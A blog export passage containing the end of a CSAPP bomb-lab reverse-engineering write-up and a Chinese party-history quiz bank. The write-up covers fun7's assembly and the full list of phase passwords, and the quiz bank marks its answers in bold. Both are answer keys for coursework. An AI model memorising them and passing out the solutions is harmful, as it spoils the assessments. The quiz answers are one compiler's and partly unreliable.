<span class="number">1</span>;</span><br><span class="line">      <span class="keyword">return</span> half_len;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;<span class="comment">// mid &gt; passwd</span></span><br><span class="line">    max = mid - <span class="number">1</span>;</span><br><span class="line">    half_len = func4(passwd, min, max) * <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">return</span> half_len;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<p>奇怪的判断与二分法使我们暂不能看出此函数的功能，需要继续分析原<code>phase</code>函数。</p>
<p><a href="#p4">点此返回到<code>phase_4</code>调用此函数处</a>。</p>
<h2 id="fun7"><a href="#fun7" class="headerlink" title="fun7"></a>fun7</h2><p><span id = "fun7"><code>fun7</code>函数</span>对应的汇编语句如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000401204 &lt;fun7&gt;:</span><br><span class="line">  401204:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  401208:	48 85 ff             	test   %rdi,%rdi</span><br><span class="line">  40120b:	74 2b                	je     401238 &lt;fun7+0x34&gt;</span><br><span class="line">  40120d:	8b 17                	mov    (%rdi),%edx</span><br><span class="line">  40120f:	39 f2                	cmp    %esi,%edx</span><br><span class="line">  401211:	7e 0d                	jle    401220 &lt;fun7+0x1c&gt;</span><br><span class="line">  401213:	48 8b 7f 08          	mov    0x8(%rdi),%rdi</span><br><span class="line">  401217:	e8 e8 ff ff ff       	callq  401204 &lt;fun7&gt;</span><br><span class="line">  40121c:	01 c0                	add    %eax,%eax</span><br><span class="line">  40121e:	eb 1d                	jmp    40123d &lt;fun7+0x39&gt;</span><br><span class="line">  401220:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401225:	39 f2                	cmp    %esi,%edx</span><br><span class="line">  401227:	74 14                	je     40123d &lt;fun7+0x39&gt;</span><br><span class="line">  401229:	48 8b 7f 10          	mov    0x10(%rdi),%rdi</span><br><span class="line">  40122d:	e8 d2 ff ff ff       	callq  401204 &lt;fun7&gt;</span><br><span class="line">  401232:	8d 44 00 01          	lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">  401236:	eb 05                	jmp    40123d &lt;fun7+0x39&gt;</span><br><span class="line">  401238:	b8 ff ff ff ff       	mov    $0xffffffff,%eax</span><br><span class="line">  40123d:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  401241:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p>401208和40120b判断<code>%rdi</code>（地址<code>0x6030F0</code>）是否为0：</p>
<ul>
<li>若为0则跳到401238（401204+0x34）将值<code>0xffffffff</code>赋给<code>%eax</code>并<strong>返回</strong></li>
<li>若不为0则继续执行40120d将<code>%rdi</code>指向的值（地址<code>0x6030F0</code>指向的值）赋给<code>%edx</code>，40120f和401211比较<code>%edx</code>（地址<code>0x6030F0</code>指向的值）是否不超过<code>%esi</code>（<code>strtol</code>函数的返回值）：<ul>
<li>若<code>%edx</code>不超过<code>%esi</code>，则跳到401220（401204+0x1c）将<code>%eax</code>赋为0，401225和401227比较<code>%edx</code>和<code>%esi</code>是否相等：<ul>
<li>若相等则跳到40123d（401204+0x39）弹栈<strong>返回</strong>；</li>
<li>若不等则继续执行401229将<code>%rdi+16</code>指向的值赋给<code>%rdi</code>，40122d递归调用<code>fun7</code>函数，401232将<code>%rax</code>的值乘2加1赋给<code>%eax</code>，401236跳到40123d（401204+0x39）弹栈<strong>返回</strong></li>
</ul>
</li>
<li>若<code>%edx</code>超过<code>%esi</code>，则继续执行401213将<code>%rdi+8</code>指向的值赋给<code>%rdi</code>，401217递归调用<code>fun7</code>函数，40121c将返回值乘2，40121e跳到40123d（401204+0x39）弹栈<strong>返回</strong></li>
</ul>
</li>
</ul>
<p>可以看出此部分的递归调用等价于：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun7</span><span class="params">(<span class="keyword">int</span>* p_node, <span class="keyword">int</span> target)</span> </span>&#123;<span class="comment">// %rdi %esi</span></span><br><span class="line">	<span class="keyword">if</span> (p_node == <span class="number">0</span>)<span class="comment">// %rdi</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xffffffff</span>;<span class="comment">// %eax</span></span><br><span class="line">  num = *p_node;<span class="comment">// (%rdi)-&gt;%edx</span></span><br><span class="line">  <span class="keyword">if</span> (num &lt;= target) &#123;<span class="comment">// %edx &lt;= %esi</span></span><br><span class="line">    result = <span class="number">0</span>;<span class="comment">// %eax</span></span><br><span class="line">    <span class="keyword">if</span> (num == target)</span><br><span class="line">      <span class="keyword">return</span> result;<span class="comment">// %eax=0</span></span><br><span class="line">    <span class="keyword">else</span> &#123;<span class="comment">// %edx == %esi</span></span><br><span class="line">    	p_node = *(p_node + <span class="number">2</span>);<span class="comment">// %rdi</span></span><br><span class="line">    	result = fun7(p_node, target);<span class="comment">// %eax</span></span><br><span class="line">    	<span class="keyword">return</span> result * <span class="number">2</span> + <span class="number">1</span>;<span class="comment">// %eax</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;<span class="comment">// %edx &gt; %esi</span></span><br><span class="line">    p_node = *(p_node + <span class="number">1</span>);<span class="comment">// %rdi</span></span><br><span class="line">    result = fun7(p_node, target);<span class="comment">// %eax</span></span><br><span class="line">    <span class="keyword">return</span> result * <span class="number">2</span>;<span class="comment">// %eax</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<p>奇怪的条件判断与递归调用使我们暂不能看出此函数的功能，需要继续分析原<code>phase</code>函数。</p>
<p><a href="#backToSec">点此返回到<code>secret_phase</code>调用此函数处</a>。</p>
<h1 id="拆弹结束"><a href="#拆弹结束" class="headerlink" title="拆弹结束"></a>拆弹结束</h1><p>将以上得到的各个<code>phase</code>的password存入<code>passed.txt</code>中：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Border relations with Canada have never been better.</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">0 207</span><br><span class="line">0 0 DrEvil</span><br><span class="line">9/N567</span><br><span class="line">4 3 2 1 6 5</span><br><span class="line">22</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>注意：</p>
<ol>
<li><code>phase_3</code>、<code>phase_4</code>、<code>phase_5</code>和<code>secret_phase</code>的password均有多种情况，请只选择一种输入；</li>
<li>若想进入并拆除<code>secret_phase</code>，请在第4行后添加空格和<code>DrEvil</code>，并在第6行后添加一行，输入<code>secret_phase</code>的password；</li>
<li><strong>文件最后一定要另起一空行，以代表输入结束。</strong></li>
</ol>
<p>若password全部正确，则会看到输出为：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line">which to blow yourself up. Have a nice day!</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">That&#x27;s number 2.  Keep going!</span><br><span class="line">Halfway there!</span><br><span class="line">So you got that one.  Try this one.</span><br><span class="line">Good work!  On to the next...</span><br><span class="line">Curses, you&#x27;ve found the secret phase!</span><br><span class="line">But finding it and solving it are quite different...</span><br><span class="line">Wow! You&#x27;ve defused the secret stage!</span><br><span class="line">Congratulations! You&#x27;ve defused the bomb!</span><br></pre></td></tr></table></figure>
<p><em>特别鸣谢：本实验部分思路受<a href="https://hakula.xyz/csapp/bomblab.html">Hakula</a>启发，在此表示感谢。</em></p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/1988.jpeg" alt="1988"></p>
]]></content>
      <tags>
        <tag>Computer Systems</tag>
        <tag>Lab Assignments</tag>
      </tags>
  </entry>
  <entry>
    <title>理论学习（一）</title>
    <url>/Theory-Study-1/</url>
    <content><![CDATA[<p>本文整理了理论学习的有关资料，如有错误恳请指正。</p>
<a id="more"></a>

<p><em>2020.4.28更新：由于党建系统已经更正原题库的混乱顺序，我对本文档重新进行了校对，对部分题目进行了勘误。</em></p>
<p><em>2020.4.28更新：校对了一～七课。</em></p>
<p><em>2020.4.29更新：校对了八～二十课。</em></p>
<h1 id="一-近代革命史的起点"><a href="#一-近代革命史的起点" class="headerlink" title="一 近代革命史的起点"></a>一 近代革命史的起点</h1><p>在五四运动以后的马克思主义传播中，（）起主要作用。<br><strong>李大钊</strong><br>王尽美<br>蔡和森<br>周恩来</p>
<p>苏俄政府发表的第一次对华宣言刊登在（）等刊物。<br><strong>《新青年》</strong><br>《时务报》<br>《民报》<br><strong>《东方杂志》</strong></p>
<p>马克思主义哲学在中国的传播,使之成为中国一种崭新的哲学形态是由于（）。<br><strong>马克思主义哲学适应了当时中国社会实践发展的需要</strong><br><strong>与中国传统哲学中丰富的唯物主义思想、辩证法思想和世界大同思想相结合</strong><br>涌现出一批先进分子的宣传<br><strong>马克思主义哲学适应了迫切要求改变中国半封建半殖民地落后状况的需要</strong></p>
<p>陈独秀在上海创办的（）杂志，犹如黑夜中的一道闪电，掀起一场空前的新文化运动的狂潮。<br><strong>《新青年》</strong><br>《东方杂志》<br>《民报》<br>《时务报》</p>
<p>新文化运动的基本口号是“德先生”（Democracy）和“赛先生”（Science）是指（）。<br><strong>民主和科学</strong><br>民族和科学<br>民族和科技<br>民主和科技</p>
<p>（）是中国颂扬俄国十月革命的第一人。<br><strong>李大钊</strong><br>林则徐<br>毛泽东<br>孙中山</p>
<p>五四运动时期，工人阶级深受（ ）的三重压迫，具有强烈的改变现状的要求，在革命斗争中比任何别的阶级都要坚决和彻底。<br><strong>封建主义</strong><br><strong>帝国主义</strong><br><strong>官僚资本主义</strong><br>资本主义</p>
<p>（），给中国的先进分子以深刻的启发，使他们逐渐觉悟到必须另外探寻新的救国救民的道路。<br><strong>辛亥革命的失败</strong><br>鸦片战争的爆发<br>民主革命的发起<br>封建势力的动荡</p>
<p>关于五四运动的说法不正确的是（   ）。<br>青年学生起到先锋作用<br><strong>标志着中国社会主义革命的开始</strong><br>是彻底的反帝反封建的爱国运动<br>无产阶级发挥了主力军作用</p>
<p>资本—帝国主义对中国的入侵（ ）。<br><strong>是决定近代中国社会性质、革命性质的重要依据</strong><br><strong>是产生近代中国社会基本矛盾和各种社会矛盾的主要根源</strong><br><strong>是近代中国社会贫困落后的原因之一</strong><br>为中国带来了资本主义的先进生产方式</p>
<p><em>2020.4.28更新：上题更改了答案，去掉了最后一项。</em></p>
<p>1912年1月1日，中华民国临时政府成立，定都（）。<br>北京<br>广州<br>武昌<br><strong>南京</strong></p>
<p>以下关于辛亥革命意义的叙述，正确的是（）。<br><strong>打击了帝国主义在中国的殖民统治，为中国民族资本主义的进一步发展创造了有利条件</strong><br>推翻了清朝的反动统治，结束了中国两千多年的封建制度<br><strong>使资产阶级民主共和的观念深入人心</strong><br><strong>建立了资产阶级共和国，使人民获得了一些民主自由的权利</strong></p>
<p>帝国主义列强对中国进行文化渗透的目的是（ ）。<br>干涉中国内政<br>传播西方文化和科学<br><strong>宣扬殖民主义奴化思想，麻醉中国人民的精神，摧毁中国人民的民族自尊心和自信心</strong><br>进行传教活动</p>
<p>辛亥革命爆发的时间是（）。<br>1911年11月<br>1910年10月<br>1910年11月<br><strong>1911年10月</strong></p>
<p>下列哪一事件标志着中国从旧民主主义革命转变为新民主主义革命（   ）。<br>中国共产党的成立<br><strong>五四运动</strong><br>辛亥革命<br>中华人民共和国的成立</p>
<p>近代中国诞生的新兴的被压迫阶级是（ ）。<br>城市贫民<br>手工业者<br><strong>工人阶级</strong><br>失业的农民</p>
<p>中国的先进分子接受马克思主义，从一开始就不是把它当作单纯的学理来探讨，而是把它作为（）。<br>实现民主改革的手段<br>打到外来入侵者的武器<br>实现民族复兴的工具<br><strong>观察国家命运的工具</strong></p>
<p>孙中山发起成立同盟会的时间是（）。<br>1895年<br><strong>1905年</strong><br>1900年<br>1910年</p>
<p>与五四爱国运动爆发密切相关的是（   ）。<br>华盛顿会议的召开<br>三国同盟的成立<br><strong>巴黎和会的召开</strong><br>三国协约的成立</p>
<p>所谓“国中之国”是指（）。<br>帝国主义强迫我国开放的通商口岸<br><strong>租借地</strong><br>帝国主义在华的势力范围<br>帝国主义强迫清政府割让的土地</p>
<h1 id="二-中国共产党的创立"><a href="#二-中国共产党的创立" class="headerlink" title="二 中国共产党的创立"></a>二 中国共产党的创立</h1><p>党的二大没有通过的决议案是（）。<br><strong>提出消灭资本家私有制</strong><br>通过了党的第一个章程<br>提出把党建设成为一个革命的群众性的无产阶级政党的任务<br>提出中国共产党是中国无产阶级的先锋队，是无产阶级的忠实代表，旗帜鲜明地展示了党的先进性</p>
<p>中国共产党在中共（）大上向全国人民第一次提出明确的反帝反封建的民主革命纲领。<br>一<br><strong>二</strong><br>四<br>三</p>
<p>在中共（）大上，确认了中国共产党是共产国际的一个支部。<br><strong>二</strong><br>三<br>四<br>一</p>
<p>1920年4月，经共产国际批准，俄共（布）远东局派维经斯基等人来华。他们先后在（）、（）会见李大钊和陈独秀，讨论建立共产党的问题，并帮助进行建党的准备工作。<br><strong>北京 上海</strong><br>武汉 北京<br>武汉 广州<br>北京 天津</p>
<p>中国共产党建党初期，不仅在国内，在国外也建立了共产党的组织，其中包括（）。<br>英国<br>瑞士<br><strong>法国</strong><br><strong>日本</strong></p>
<p>在中共一大上来自于武汉的党代表是（）。<br>王尽美<br>毛泽东<br>李达<br><strong>陈潭秋</strong></p>
<p>1921年7月23日，中国共产党第一次全国代表大会在（）召开。<br>天津<br><strong>上海</strong><br>广东<br>武汉</p>
<p>中国共产党的最早组织是在（）建立的。<br>广东<br>天津<br>北京<br><strong>上海</strong></p>
<p>中国共产党一大选举（）为党的领导机构——中央局的书记。<br>毛泽东<br>李大钊<br><strong>陈独秀</strong><br>董必武</p>
<p>（）是中国工人阶级第—次直接同帝国主义势力进行的有组织的较量。罢工的胜利，增强了工人阶级的战斗勇气和信心，推动了全国工人运动的发展。<br><strong>香港海员罢工</strong><br>二七大罢工<br>安源路矿工人罢工<br>开滦煤矿工人罢工</p>
<p>中共二大提出的现阶段的纲领即最低纲领是（）。<br><strong>打倒军阀</strong><br><strong>统一中国为真正的民主共和国</strong><br><strong>推翻国际帝国主义的压迫</strong><br>发动工人力量</p>
<p>1922年至1923年间，中国共产党领导了许多工人运动，并总结出了重要的经验教训，不包括（）。<br>在半殖民地半封建的中国，工人没有起码的民主权利<br>为了战胜中国革命的敌人，仅仅靠工人阶级孤军奋战是不够的<br><strong>中外反动势力过于强大，必须联合任何力量推动新中国的成立</strong><br>没有革命的武装斗争，仅仅依靠罢工或其他合法斗争是不行的</p>
<p>各地共产党早期组织成立以后，主要开展的活动有（）。<br><strong>同反马克思主义的思潮展开论战，帮助一批进步分子划清科学社会主义同其他社会主义派别的界限，最终走上马克思主义的道路。</strong><br><strong>宣传马克思主义，组织进步青年学习马克思主义，研究中国的实际问题。</strong><br><strong>通过在工人中进行宣传和组织工会的工作，使工人开始接受马克思主义的教育，阶级觉悟有所提高。</strong><br><strong>建立青年团组织，组织团员学习马克思主义，参加实际斗争，为党培养后备力量。</strong></p>
<p>1921年7月23日，中国共产党第一次全国代表大会在上海召开。出席的共产国际代表是（）。<br>维经斯基<br>安德罗波夫<br><strong>尼科尔斯基</strong><br><strong>马林</strong></p>
<p>中国共产党第一次代表大会讨论了实际的工作计划，会议决定（）。<br><strong>集中精力领导工人运动，组织工会和教育工人</strong><br>要通过民主革命进一步创造条件，实现社会主义和共产主义<br>团结一切可以团结的力量，为建设伟大的社会主义祖国而共同奋斗<br>坚持“要搞马克思主义，不要搞修正主义；要团结，不要分裂</p>
<p>下列关于中国共产党的成立，描述不正确的是（）。<br>中国共产党作为中国最先进的阶级工人阶级的政党，不仅代表着工人阶级的利益，而且代表着整个中华民族的利益<br><strong>在一大上通过决议案，确认中国共产党是共产国际的一个支部，这在当时是必要的选择</strong><br>中国共产党的成立，适应了近代以来社会进步和革命发展的客观要求，是开天辟地的大事变<br>中国共产党从一开始就拥有马克思主义这个最先进的思想武器，因而能够为中国革命指明前进的方向</p>
<p>（），中国共产党派代表出席共产国际在莫斯科召开的远东各国共产党及民族革命团体第一次代表大会。<br><strong>1922年1月</strong><br>1921年11月<br>1922年2月<br>1921年12月</p>
<p>中国共产党是在幅员广大、人口众多、情况复杂、经济文化落后的半殖民地半封建的旧中国开展活动的，需要有一个探索的过程，其中包括（）。<br><strong>制定出符合国情的民主革命纲领</strong><br><strong>如何把马克思主义的基本原理同中国革命的具体实践正确地结合起来</strong><br><strong>从何处着手进行革命</strong><br><strong>搞清楚民主革命与社会主义革命的区别和联系</strong></p>
<p><em>2020.4.28更新：上题整理时出现遗漏，应包括第一项。</em></p>
<p>1923年（）爆发的京汉铁路三万名工人大罢工，使第一次工人运动浪潮达到顶峰。<br>2月5日<br>2月6日<br>2月7日<br><strong>2月4日</strong></p>
<p>1923年2月4日爆发的京汉铁路三万名工人大罢工，使第一次工人运动浪潮达到顶峰。但在（）之后，全国工人运动转入暂时低潮。<br><strong>二七惨案</strong><br>青岛惨案<br>沙田惨案<br>五卅惨案</p>
<h1 id="三-第一次国共合作和大革命的爆发"><a href="#三-第一次国共合作和大革命的爆发" class="headerlink" title="三 第一次国共合作和大革命的爆发"></a>三 第一次国共合作和大革命的爆发</h1><p>大革命失败的原因不包括（）。<br><strong>党的路线选择在大革命初期出现了问题，不应相信软弱的代表资产阶级利益的国民党</strong><br>陈独秀等人在后期犯了右倾机会主义的错误<br>帝国主义和封建势力的联合力量比革命阵营的力量要强大得多<br>国民党背信弃义地对共产党及其领导的工农群众发动突然袭击</p>
<p>以下属于中国共产党对于戴季陶在思想理论上的严厉回击的是（）。<br><strong>《给戴季陶的一封信》</strong><br><strong>《中国国民革命与戴季陶》</strong><br><strong>《读〈孙文主义之哲学的基础〉》</strong><br><strong>《中国国民革命与中国共产党》</strong></p>
<p>1926年5月3日至19日，国民党第二次全国代表大会在广州召开。其主要成果有（）。<br><strong>重申了反帝反封建的政治主张</strong><br><strong>通过了《弹劾西山会议决议案》</strong><br><strong>坚持联俄、联共、扶助农工的三大政策</strong><br>开除参加西山会议的成员党籍</p>
<p>共产党员以个人身份加入国民党，实现国共合作这一决定发生在（）。<br>共产党二大<br>国民党一大<br><strong>共产党三大</strong><br>国民党二大</p>
<p>北伐军在短时间内取得巨大胜利的原因不包括（）。<br><strong>国共联合后的北伐军军事力量强于各军阀，并制定了集中兵力、各个歼敌的战略方针</strong><br>指战员有着明确的革命目标和不怕牺牲、英勇作战的革命精神<br>苏联军事顾问的帮助和苏联提供的物资援助<br>得到广大工人、农民和其他革命群众的直接支援</p>
<p>国民革命前的国民党是代表（）的政党。<br>大资产阶级和官僚资产阶级<br>封建军阀和民族资产阶级<br>大资产阶级和城市小资产阶级<br><strong>民族资产阶级和城市小资产阶级</strong></p>
<p>国民党一大召开的时间和地点是（）。<br>1922 上海<br>1922 武汉<br><strong>1924 广州</strong><br>1924 上海</p>
<p>1927年3月21日，上海工人在陈独秀、周恩来等组成的特别委员会领导下，发动总罢工，随即转为武装起义。经过三十多个小时的战斗，占领上海除租界以外的地区，并成立（）。<br>上海市特别临时市政府<br>上海市临时特别市政府<br><strong>上海特别市临时市政府</strong><br>上海临时市特别市政府</p>
<p>“四一二”政变中在北京英勇就义的中共中央政治局委员是（）。<br>张太雷<br>蔡和森<br><strong>李大钊</strong><br>翟秋白</p>
<p>共产党员（）领导的独立团，成为赢得“铁军”称号的第四军中英勇善战的一支部队。<br><strong>叶挺</strong><br>陈赓<br>叶剑英<br>贺龙</p>
<p>中国共产党于1923年6月12日至20日在广州召开第三次全国代表大会。三大明确规定，在共产党员加入国民党时，党必须在（）保持自己的独立性。<br>工作上<br><strong>政治上</strong><br><strong>思想上</strong><br><strong>组织上</strong></p>
<p>1925年六、七月间，国民党中央执行委员戴季陶先后发表（）两本反动小册子。<br><strong>《孙文主义之哲学的基础》</strong><br><strong>《国民革命与中国国民党》</strong><br>《国民革命与群众的标语》<br>《孙文主义之国民革命军》</p>
<p><em>2020.4.28更新：上题整理时出现错误，应为第一项而不是第四项。</em></p>
<p>五卅惨案导致了（）。<br>安源路矿工人大罢工<br>二七大罢工<br>海员大罢工<br><strong>省港大罢工</strong></p>
<p>“四一二”政变后国共合作并未完全破裂，中共中央仍在和（）的国民党人合作。<br><strong>武汉</strong><br>广州<br>南京<br>北京</p>
<p>“四一二”政变后全国形成了（）多个政权对峙的局面。<br><strong>南京</strong><br>广州<br><strong>北京</strong><br><strong>武汉</strong></p>
<p>1925年11月，谢特、张继、邹鲁等十余人在北京西山碧云寺召开非法的“国民党一届四中全会”，会议内容不包括（）<br>开除国民党中央执行委员会中的共产党员<br>通过反动决议<br>取消共产党员的国民党党籍<br><strong>继续坚持孙中山的联俄、联共和扶助农工的三大政策</strong></p>
<p>中国共产党在准备建立统一战线时，经过慎重选择，同国民党合作，此时国民党的优势不包括（）。<br><strong>国民党大体上是代表民族资产阶级和城市小资产阶级的政党，具有政治优势</strong><br>孙中山在经历多次挫折后，深感其领导的革命必须改弦易辙，真诚地欢迎共产党员同他合作，欢迎苏联援助中国革命<br>它的领袖孙中山在人们心目中是中华民国的缔造者，他所领导的国民党在社会上是有威信的<br>在中国南方建起了一块能够容纳各种革命力量进行活动的根据地，拥有一支数万人的军队</p>
<p>1925年11月，谢特、张继、都鲁等十余人在北京西山碧云寺召开非法的（）。<br>国民党二届三中全会<br>国民党二届四中全会<br><strong>国民党一届四中全会</strong><br>国民党一届三中全会</p>
<p>以推翻帝国主义在华势力和北洋军阀为目标的革命运动即国民大革命的时间是（）。<br><strong>1924年至1927年</strong><br>1923年至1926年<br>1924年至1928年<br>1923年至1927年</p>
<p>中共历史上第一个牺牲在战斗第一线的中央委员和政治局成员是（）。<br>蔡和森<br>李大钊<br><strong>张太雷</strong><br>瞿秋白</p>
<h1 id="四-土地革命和抗日战争"><a href="#四-土地革命和抗日战争" class="headerlink" title="四 土地革命和抗日战争"></a>四 土地革命和抗日战争</h1><p>标志着以国共两党合作为基础的抗日民族统一战线正式形成的是（）。<br><strong>蒋介石发表实际上承认中国共产党合法地位的谈话</strong><br>周恩来等向蒋介石送交《中共中央为公布国共合作宣言》<br>毛泽东等致电蒋介石，表示愿意“与敌周旋，以达保土卫国之目的”<br>中共军队更改番号</p>
<p>抗日战争胜利的历史意义有（）。<br><strong>是中华民族由衰败走向振兴的重大转折点</strong><br><strong>使中华民族一洗百年耻辱</strong><br><strong>使中国的国际地位空前提高</strong><br><strong>为夺取整个新民主主义革命的胜利，奠定了坚实的基础</strong></p>
<p>红军长征途中经过的主要江河有（）。<br><strong>湘江</strong><br><strong>乌江</strong><br><strong>金沙江</strong><br><strong>赤水河</strong></p>
<p>红军长征主要是由于（）。<br>日本大局侵略北方<br>革命形势发展的需要<br>“左”倾错误严重泛滥<br><strong>第五次反“围剿”的失利</strong></p>
<p>为什么中国能取得抗日战争的胜利？<br><strong>世界反法西斯战争中各同盟国家的支援</strong><br><strong>全国人民团结一心，共同抗日</strong><br><strong>发动人民战争，使日本侵略者陷于人民战争的汪洋大海之中</strong><br><strong>中国共产党在全民族抗战中起到了中流砥柱的作用</strong></p>
<p>（）之后，以毛泽东为核心的党的中央的正确领导开始确立。<br><strong>遵义会议</strong><br>中华苏维埃第一次全国代表大会<br>八七会议<br>中国共产党第七次全国代表大会</p>
<p>国际反法西斯统一战线正式形成的标志是（）。<br>美国对日本宣战<br>中共中央主张建立反法西斯的国际统一战线<br><strong>26个国家签署《联合国家宣言》</strong><br>诺曼底登陆战的胜利</p>
<p>1936年底发生的扭转时局的关键事件、国共两党第二次合作初步形成的标志是（）。<br><strong>西安事变的和平解决</strong><br>“九一八事变”爆发<br>红军长征胜利结束<br>国民党“一大”的召开</p>
<p>中共七大总结历史经验，把党在长期奋斗中形成的优良传统作风概括为三大作风，三大作风的内涵为（）。<br><strong>理论和实践相结合的作风</strong><br>实事求是的作风<br><strong>和人民群众紧密联系在一起的作风</strong><br><strong>批评与自我批评的作风</strong></p>
<p>“军叫工农革命，旗号镰刀斧头。秋收时节幕云愁，霹雳一声暴动”，这是毛泽东在1927年写的一首词，这首词赞颂的是（）。<br>南昌起义<br><strong>秋收起义</strong><br>上海工人起义<br>广州起义</p>
<p>中共七大是中国共产党在民主革命时期召开的最重要的一次代表大会，主要是因为（）。<br>毛泽东在会上作了《论联合政府》的报告<br>大会指定了党的政治路线<br>大会选举了以毛泽东为首的中央领导集体<br><strong>大会确立了毛泽东思想为党的指导思想</strong></p>
<p>我校著名校友张太雷同志是在（）中英勇牺牲的。<br><strong>广州起义</strong><br>南昌起义<br>秋收起义<br>上海起义</p>
<p>下列各项中，由周恩来直接领导或参加的是（）。<br>①南昌起义②秋收起义③八七会议④红军第五次反“围剿”⑤遵义会议<br>①②⑤<br>①②③⑤<br>②③④⑤<br><strong>①④⑤</strong></p>
<p>1935年12月9日，数千爱国学生在（）举行了声势浩大的抗日游行，史称“一二九”运动。<br>天津<br>延安<br>上海<br><strong>北平</strong></p>
<p>1936年12月12日，（）发动了震惊中外的西安事变。<br><strong>张学良</strong><br>刘伯承<br><strong>杨虎城</strong><br>叶挺</p>
<p>日本天皇宣布无条件投降的时间是（）。<br>1945年8月9日<br><strong>1945年8月15日</strong><br>1945年9月17日<br>1945年9月12日</p>
<p>七大把党在长期奋斗中形成的优良传统作风概括为三大作风，下面不属于三大作风的是（）。<br>和人民群众紧密联系在一起的作风<br>理论和实践相结合的作风<br>自我批评的作风<br><strong>坚持为人民服务的作风</strong></p>
<p>1942年2月，毛泽东先后作《整顿党的作风》和《反对党八股》的讲演。整风运动最主要的任务是（）。<br><strong>反对主观主义</strong><br>反对党八股<br>反对左倾主义<br>反对经验主义</p>
<p>下面关于毛泽东思想，说法不正确的是（）。<br>是全体中国共产党领导人智慧的结晶<br>中共七大上确立了毛泽东思想的指导地位<br>是马克思列宁主义的理论与中国革命的实践之统一的思想<br><strong>是关于毛泽东同志在军事方面的思想</strong></p>
<p>抗日战争后期，制定了“放手发动群众，壮大人民力量，在我党的领导下，打败日本侵略者，解放全国人民，建立一个新民主主义的中国”的党在新形势下的路线的会议是（）。<br>洛川会议<br><strong>中共七大</strong><br>瓦窑堡会议<br>中共六届七中全会</p>
<h1 id="五-重庆谈判和解放战争"><a href="#五-重庆谈判和解放战争" class="headerlink" title="五  重庆谈判和解放战争"></a>五  重庆谈判和解放战争</h1><p>1949年9月21日，中国人民政治协商会议第一届全体会议在北平隆重开幕，这次政协会议通过了《中国人民政治协商会议共同纲领》，其中规定（）。<br><strong>中华人民共和国为新民主主义即人民民主主义的国家</strong><br><strong>经济建设的根本方针是“以公私兼顾、劳资两利、城乡互助、内外交流的政策，达到发展生产、繁荣经济之目的”</strong><br><strong>各级政权机关一律实行民主集中制</strong><br><strong>人民行使国家政权的机关为各级人民代表大会和各级人民政府</strong></p>
<p>气势磅礴的人民解放战争，摧毁了国民党的反动政权，基本上完成中国民主革命反帝反封建最主要的历史任务。为赢得这场战争，人民解放军指战员牺牲（）万人，负伤104万人。<br><strong>26</strong><br>25<br>23<br>24</p>
<p>从1947年3月起，国民党军对解放区的全面进攻受挫后，改为重点进攻（）、（）两个解放区，而在其他战场转为守势。<br><strong>陕北</strong><br><strong>山东</strong><br>中原<br>晋冀鲁豫</p>
<p>辽沈战役刚结束，党中央即电令刘伯承、陈毅、邓小平、粟裕、谭震林组成以（）为书记的总前委。<br>陈毅<br>刘伯承<br>粟裕<br><strong>邓小平</strong></p>
<p>国民党的内战政策，激起要求和平民主的广大人民的强烈愤慨。1945年11月下旬，（）学生举行反内战集会，三万余人罢课。12月1日，国民党派武装暴徒镇压学生。<br><strong>昆明</strong><br>武汉<br>重庆<br>北平</p>
<p>1945年10月，经过四十三天复杂而艰苦的谈判，国共双方于10月10日正式签署会谈纪要，即双十协定。会议达成多项共识，但在（）两个基本问题上未达成协议。<br><strong>人民解放军</strong><br><strong>解放区政权</strong><br>和平建国的基本方针<br>召开政治协商会议</p>
<p>国民党政权所代表的是（）的利益，它经受不住、也不能容忍任何的民主改革。<br>地主阶级<br><strong>大地主大资产阶级</strong><br>无产阶级<br>民族资产阶级</p>
<p>国民党军队主力基本被消灭是在（）。<br>渡江战役后<br><strong>三大战役后</strong><br>全国大陆解放后<br>南京解放后</p>
<p>国民党军队22万人进攻中原解放区，全面内战爆发的时间是（）。<br><strong>6月26日</strong><br>6月23日<br>7月23日<br>5月4日</p>
<p>在山东，华东野战军在（）的指挥下，于5月中旬在孟良崮战役中全歼敌精锐主力整编第七十四师3.2万余人，挫败了国民党军对山东解放区的重点进攻。<br><strong>陈毅</strong><br><strong>粟裕</strong><br>彭德怀<br>刘伯承</p>
<p>（）的解放，有力地证明解放军的城市攻坚作战能力已大大提高，蒋介石以大城市为重点的防御体系开始崩溃。<br>北京<br>锦州<br><strong>济南</strong><br>天津</p>
<p>在中国新民主主义革命即将取得全国胜利的前夜，中共中央于1948年9月召开政治局扩大会议，为最后打败蒋介石、夺取革命在全国的胜利作了思想、政治、组织上的重要准备。1949年3月，又在（）召开七届二中全会。<br><strong>西柏坡</strong><br>西安<br>延安<br>北平</p>
<p>提出中国共产党工作重心由农村转入城市的会议是（）。<br>中国人民政治协商会议筹备会议<br>中国人民政治协商会议第一次全体会议<br><strong>中共七届二中全会</strong><br>1947年中共中央十二月会议</p>
<p>重庆谈判前，中共中央经过反复研究，提出的三大政治口号不包括（）。<br>和平<br><strong>统一</strong><br>团结<br>民主</p>
<p>中国人民政治协商会议第一届全体会议一致选举毛泽东为中央人民政府主席，并选出几位副主席，其中不包括（）。<br>刘少奇<br>朱德<br>宋庆龄<br><strong>周恩来</strong></p>
